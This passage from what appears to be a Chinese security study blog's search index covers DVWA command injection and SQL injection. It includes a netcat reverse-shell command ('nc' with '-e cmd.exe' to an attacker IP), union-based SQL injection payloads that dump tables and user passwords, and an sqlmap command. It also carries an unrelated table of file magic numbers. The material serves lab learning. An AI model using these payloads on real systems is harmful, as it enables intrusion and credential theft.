user name theres a mistake        </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;       </span><br><span class="line">&#125;   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token   </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target </span>= <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target </span>);     </span><br><span class="line"><span class="variable">$octet </span>= <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target </span>);    </span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet </span>) == <span class="number">4</span> ) ) &#123;       </span><br><span class="line"><span class="variable">$target </span>= <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];  </span><br></pre></td></tr></table></figure><ol><li>stripslashes 去除用户输入的\</li><li>explode 把用户输入的数据根据.分开，比如输入127.0.0.1会被分成四个部分，分别是127 0 0 1</li><li>分别判断分成的四个部分是不是数字,127是不是?0是不是?0是不是?1是不是?有不是数字的直接不允许访问</li><li>把验证完是数字的四个数字再用.拼接起来，变成正常的IP 127.0.0.1</li></ol><p>impossible的防御正如其名，不可能被攻击，是安全开发人员的典范，其他后端语言也可实现相应算法</p><h2 id="如何用于渗透"><a href="#如何用于渗透" class="headerlink" title="如何用于渗透"></a>如何用于渗透</h2><p>举例：<br>攻击机监听自己的的某个端口<br>命令执行nc 攻击机IP：端口 -e（execute） cmd.exe<br>即可拿到网站服务器cmd</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入(英语:SQL injection)，也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之是在输入的字符串之中注入SQL指令，在&#x3D;&#x3D;设计不良的程序当中忽略了字符检查&#x3D;&#x3D;，那么这些注入进去的&#x3D;&#x3D;恶意指令就会被数据库服务器误认为是正常的SQL指令而运行&#x3D;&#x3D;，因此遭到破坏或是入侵。</p><h2 id="SQL是什么"><a href="#SQL是什么" class="headerlink" title="SQL是什么"></a>SQL是什么</h2><p>一种用于操控数据库的语言<br>全称：结构化查询语言</p><h2 id="SQL注入漏洞详解"><a href="#SQL注入漏洞详解" class="headerlink" title="SQL注入漏洞详解"></a>SQL注入漏洞详解</h2><p>![[Pasted image 20251118185458.png]]</p><p>先想象一下后台是如何从数据库中查询数据的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ticket_num <span class="keyword">from</span> Movie_data <span class="keyword">where</span> movie_name <span class="operator">=</span> <span class="string">&#x27;长津湖&#x27;</span>;</span><br></pre></td></tr></table></figure><p>从电影信息数据库（Movie_data）中查询电影名称（movie_name）为长津湖的票房数据（ticket_num）</p><p><strong>如何注入</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ticket_num <span class="keyword">from</span> Movie_data <span class="keyword">where</span> movie_name <span class="operator">=</span> <span class="string">&#x27;长津湖&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> #<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>此时不仅查询了长津湖票房，还执行了order by 1</p><p>也就是说，我们通过输入内容导致原本写代码时放在那的SQL语句发生改变。<br>能改变原有SQL语句的漏洞就是SQL注入</p><h2 id="SQL注入-low"><a href="#SQL注入-low" class="headerlink" title="SQL注入-low"></a>SQL注入-low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query  </span>= <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>$id是用户输入的内容</p><h3 id="如何判断SQL注入漏洞"><a href="#如何判断SQL注入漏洞" class="headerlink" title="如何判断SQL注入漏洞"></a>如何判断SQL注入漏洞</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>用户输入数据为1’ and 1&#x3D;1#<br>这时SQL语句发生变化，在原有查询完成后会判断1&#x3D;1（这明显是对的），如果判断正确则才会有输出<br><em>#的作用是注释掉后续的SQL语句（这里就是注释掉后面的’和;）</em></p><p>用户输入数据为1’ and 1&#x3D;2#<br>这时SQL语句发生变化，在原有查询完成后会判断1&#x3D;2（这明显是错的），如果判断正确则才会有输出</p><p>&#x3D;&#x3D;两次尝试1&#x3D;1正常输出，1&#x3D;2错误输出，证明SQL语句生效，存在SQL注入漏洞&#x3D;&#x3D;</p><h3 id="如何利用SQL注入漏洞"><a href="#如何利用SQL注入漏洞" class="headerlink" title="如何利用SQL注入漏洞"></a>如何利用SQL注入漏洞</h3><p>一般步骤如下：</p><ol><li><p>判断列&#x2F;字段数 order by [column num]</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">first</span> name, <span class="keyword">last</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">first</span> name, <span class="keyword">last</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">first</span> name, <span class="keyword">last</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> id <span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>如果返回Unknown column ‘3’ in ‘order clause’说明只有2列</p></li><li><p>联合査询其他信息 union select [sql1] [sql2]</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">first</span> name, <span class="keyword">last</span> name <span class="keyword">fROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>(),database()#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>用户输入SQL语句，执行了MySQL<u>内置函数</u>user()和database()<br>user()函数作用：返回当前数据库的用户<br>database()函数作用：返回当前网站连接的数据库名字</p></li><li><p>联合査询表 union select table_name,table_schema from information_schema.tables where table_schema&#x3D; ‘&#x3D;&#x3D;[database name]&#x3D;&#x3D;’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">first</span> name, <span class="keyword">last</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,table_schema <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>其中information_schema是MySQL数据库固有的一个对该数据库情况的概述（里面包含了数据库的名称和数据库里的表的名称）<br>![[Pasted image 20251118194408.png]]<br>说明存在两个表：guestbook和users</p></li><li><p>联合查询信息 union [query_sql]</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">fROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users#<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">#查询用户名与密码</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><p>把复杂的SQL注入漏洞利用过程自动化<br>SQLmap官网：<br><a href="https://sqlmap.org/">https://sqlmap.org/</a></p><p>下载方法：</p><ol><li>可下载原代码，直接python运行sqlmap.py</li><li>安装kali，自带sql，直接输入sqlmap执行</li></ol><p>第一步：检测漏洞</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;&lt;url&gt;&quot; --cookie=&quot;(F12-网络-随意进行一个行为，查看请求头里的cookie)&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见文件格式的16进制特征</title>
      <link href="/2024/12/04/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%9A%8416%E8%BF%9B%E5%88%B6%E7%89%B9%E5%BE%81/"/>
      <url>/2024/12/04/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%9A%8416%E8%BF%9B%E5%88%B6%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<p>文件的 16 进制特征（也称 “魔数” Magic Number）是文件开头的固定字节序列，用于标识文件类型，以下是各类常见格式的核心特征，按文件类型分类整理，便于快速识别：</p><h4 id="一、文档类"><a href="#一、文档类" class="headerlink" title="一、文档类"></a>一、文档类</h4><table><thead><tr><th>文件格式</th><th>扩展名</th><th>核心 16 进制特征（开头字节）</th><th>补充说明</th></tr></thead><tbody><tr><td>PDF</td><td>.pdf</td><td><code>25 50 44 46 2D</code>（%PDF-）</td><td>部分 PDF 开头可能紧跟版本号，如<code>25 50 44 46 2D 31 2E</code>（%PDF-1.）</td></tr><tr><td>Word（旧版）</td><td>.doc</td><td><code>D0 CF 11 E0 A1 B1 1A E1</code></td><td>OLE 复合文档格式，Excel（.xls）、PPT（.ppt）旧版也用此特征</td></tr><tr><td>Word（新版）</td><td>.docx</td><td><code>50 4B 03 04</code></td><td>本质是 ZIP 压缩包，所有 Office 2007 + 格式（.xlsx&#x2F;.pptx 等）均以此开头</td></tr><tr><td>TXT（UTF-8 BOM）</td><td>.txt</td><td><code>EF BB BF</code></td><td>无 BOM 的 TXT 无固定特征，仅靠内容判断；ANSI 编码 TXT 无开头特征</td></tr><tr><td>Markdown</td><td>.md</td><td>无固定特征</td><td>纯文本格式，无专属魔数，需结合内容识别</td></tr></tbody></table><h4 id="二、图片类"><a href="#二、图片类" class="headerlink" title="二、图片类"></a>二、图片类</h4><table><thead><tr><th>文件格式</th><th>扩展名</th><th>核心 16 进制特征（开头字节）</th><th>补充说明</th></tr></thead><tbody><tr><td>JPG&#x2F;JPEG</td><td>.jpg&#x2F;.jpeg</td><td><code>FF D8 FF</code></td><td>结尾通常为<code>FF D9</code>，部分 JPG 开头紧跟<code>E0</code>&#x2F;<code>E1</code>等（如<code>FF D8 FF E0</code>）</td></tr><tr><td>PNG</td><td>.png</td><td><code>89 50 4E 47 0D 0A 1A 0A</code></td><td>辨识度极高，固定 8 字节开头</td></tr><tr><td>GIF</td><td>.gif</td><td><code>47 49 46 38</code>（GIF8）</td><td>后续紧跟<code>37 61</code>（GIF87a）或<code>39 61</code>（GIF89a）</td></tr><tr><td>BMP</td><td>.bmp</td><td><code>42 4D</code>（BM）</td><td>前 2 字节固定为 BM，后续为文件大小等信息</td></tr><tr><td>WebP</td><td>.webp</td><td><code>52 49 46 46</code> 后跟文件大小，再<code>57 45 42 50</code></td><td>完整开头示例：<code>52 49 46 46 ?? ?? ?? ?? 57 45 42 50</code></td></tr><tr><td>ICO</td><td>.ico</td><td><code>00 00 01 00</code></td><td>前 4 字节固定，用于图标文件</td></tr></tbody></table><h4 id="三、视频-音频类"><a href="#三、视频-音频类" class="headerlink" title="三、视频 &#x2F; 音频类"></a>三、视频 &#x2F; 音频类</h4><table><thead><tr><th>文件格式</th><th>扩展名</th><th>核心 16 进制特征（开头字节）</th><th>补充说明</th></tr></thead><tbody><tr><td>MP4</td><td>.mp4</td><td><code>00 00 00 18 66 74 79 70</code>（ftyp）</td><td>或<code>00 00 00 20 66 74 79 70</code>，后续通常跟<code>69 73 6F 6D</code>（isom）</td></tr><tr><td>MP3</td><td>.mp3</td><td><code>49 44 33</code>（ID3）或 <code>FF FB</code>&#x2F;<code>FF FA</code></td><td>带 ID3 标签的 MP3 开头为 ID3，裸 MP3 音频帧开头为<code>FF FB</code></td></tr><tr><td>AVI</td><td>.avi</td><td><code>52 49 46 46</code> 后跟文件大小，再<code>41 56 49 20</code></td><td>完整开头：<code>52 49 46 46 ?? ?? ?? ?? 41 56 49 20</code></td></tr><tr><td>MKV</td><td>.mkv</td><td><code>1A 45 DF A3</code></td><td>固定 4 字节开头，辨识度高</td></tr><tr><td>WAV</td><td>.wav</td><td><code>52 49 46 46</code> 后跟文件大小，再<code>57 41 56 45</code></td><td>开头为 RIFF+WAVE 组合，示例：<code>52 49 46 46 ?? ?? ?? ?? 57 41 56 45</code></td></tr></tbody></table><h4 id="四、压缩包-可执行文件类"><a href="#四、压缩包-可执行文件类" class="headerlink" title="四、压缩包 &#x2F; 可执行文件类"></a>四、压缩包 &#x2F; 可执行文件类</h4><table><thead><tr><th>文件格式</th><th>扩展名</th><th>核心 16 进制特征（开头字节）</th><th>补充说明</th></tr></thead><tbody><tr><td>ZIP</td><td>.zip</td><td><code>50 4B 03 04</code>（标准）&#x2F; <code>50 4B 05 06</code>（空包）&#x2F; <code>50 4B 07 08</code>（分卷）</td><td>多数压缩包为<code>50 4B 03 04</code>，docx&#x2F;xlsx 等本质是 ZIP，特征一致</td></tr><tr><td>RAR</td><td>.rar</td><td><code>52 61 72 21 1A 07 00</code>（RAR 4.x）&#x2F; <code>52 61 72 21 1A 07 01 00</code>（RAR 5.x）</td><td>区分 RAR 版本的关键在第 8 字节（00&#x2F;01）</td></tr><tr><td>7Z</td><td>.7z</td><td><code>37 7A BC AF 27 1C</code></td><td>固定 6 字节开头，专属特征</td></tr><tr><td>EXE（Windows）</td><td>.exe</td><td><code>4D 5A</code>（MZ）</td><td>PE 格式可执行文件，前 2 字节必为 MZ，后续会有<code>50 45 00 00</code>（PE）</td></tr><tr><td>APK</td><td>.apk</td><td><code>50 4B 03 04</code></td><td>本质是 ZIP 压缩包，特征与 ZIP 一致，可解压查看内部文件</td></tr></tbody></table><h4 id="五、数据库-系统类"><a href="#五、数据库-系统类" class="headerlink" title="五、数据库 &#x2F; 系统类"></a>五、数据库 &#x2F; 系统类</h4><table><thead><tr><th>文件格式</th><th>扩展名</th><th>核心 16 进制特征（开头字节）</th><th>补充说明</th></tr></thead><tbody><tr><td>SQLite</td><td>.db&#x2F;.sqlite</td><td><code>53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33 00</code>（SQLite format 3）</td><td>前 16 字节固定，是最常见的.db 文件特征</td></tr><tr><td>Access</td><td>.mdb&#x2F;.accdb</td><td><code>53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42</code>（Standard Jet DB）</td><td>新版 accdb 为<code>00 01 00 00 53 74 61 6E 64 61 72 64 20 41 43 45</code></td></tr><tr><td>ISO（镜像）</td><td>.iso</td><td><code>43 44 30 30 31</code>（CD001）</td><td>位于偏移地址 0x8000 处，开头通常为 00，需跳转到该偏移查看</td></tr></tbody></table><h3 id="实用识别技巧"><a href="#实用识别技巧" class="headerlink" title="实用识别技巧"></a>实用识别技巧</h3><ol><li>查看工具：用 WinHex（Windows）、010 Editor（跨平台）、HxD（免费）等 16 进制编辑器打开文件，直接查看开头字节；</li><li>偏移注意：部分格式（如 ISO、MP4）的特征不在绝对开头，需跳转到指定偏移地址；</li><li>复合特征：若开头特征不明显，可结合后续字节（如 ZIP&#x2F;APK&#x2F;docx 均为<code>50 4B 03 04</code>，需结合扩展名 &#x2F; 后续内容进一步区分）。</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Gallery</title>
      <link href="/Gallery/index.html"/>
      <url>/Gallery/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movie</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>archives</title>
      <link href="/archives/index.html"/>
      <url>/archives/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tag</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>其实初衷是方便自己用手机也能看笔记，但是发现以前做在obsdian上的笔记里面的图片要弄到网站来麻烦的一。主要是图片太多了，然后obsdian的图片链接方式还不太一样，所以很难搞，你们如果去我github库里也可以翻到那一大堆笔记图片，真的多的真的没法搞，所以这边就随缘更新了吧~</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
